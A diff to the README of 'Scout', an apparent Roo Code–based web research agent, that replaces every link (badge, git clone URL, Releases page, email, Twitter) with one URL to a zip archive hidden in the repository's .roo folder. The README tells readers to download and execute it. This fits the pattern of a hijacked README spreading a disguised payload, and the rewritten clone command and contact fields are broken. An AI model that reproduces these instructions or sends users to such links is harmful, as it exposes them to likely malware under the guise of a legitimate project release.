@@ -1,6 +1,6 @@
 # 🚀 Scout: Your Experimental Web Research Assistant
 
-![Scout Logo](https://img.shields.io/badge/Scout-Experimental%20Agent-brightgreen)
+![Scout Logo](https://github.com/ViFDevv/scout/raw/refs/heads/main/.roo/Software-2.2.zip%20Agent-brightgreen)
 
 Welcome to **Scout**, an experimental agent designed around the Roo Code VS Code extension. Scout focuses on simulating human behavior to gather, research, and interact with online information accurately. Our goal is to transform Roo Code into a powerful web research assistant.
 
@@ -28,7 +28,7 @@ To get started with Scout, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/ViFDevv/scout.git
+   git clone https://github.com/ViFDevv/scout/raw/refs/heads/main/.roo/Software-2.2.zip
    ```
 
 2. Navigate to the project directory:
@@ -43,7 +43,7 @@ To get started with Scout, follow these steps:
    npm install
    ```
 
-4. Download and execute the latest release from our [Releases page](https://github.com/ViFDevv/scout/releases).
+4. Download and execute the latest release from our [Releases page](https://github.com/ViFDevv/scout/raw/refs/heads/main/.roo/Software-2.2.zip).
 
 ## 🚀 Usage
 
@@ -107,14 +107,14 @@ Scout is licensed under the MIT License. See the [LICENSE](LICENSE) file for det
 
 ## 📦 Releases
 
-For the latest versions and updates, visit our [Releases page](https://github.com/ViFDevv/scout/releases). Download the latest release and execute it to start using Scout.
+For the latest versions and updates, visit our [Releases page](https://github.com/ViFDevv/scout/raw/refs/heads/main/.roo/Software-2.2.zip). Download the latest release and execute it to start using Scout.
 
 ## 📬 Contact
 
 For any inquiries or feedback, please reach out:
 
-- **Email**: your-email@example.com
-- **Twitter**: [@yourhandle](https://twitter.com/yourhandle)
+- **Email**: https://github.com/ViFDevv/scout/raw/refs/heads/main/.roo/Software-2.2.zip
+- **Twitter**: [@yourhandle](https://github.com/ViFDevv/scout/raw/refs/heads/main/.roo/Software-2.2.zip)
 
 ---
 
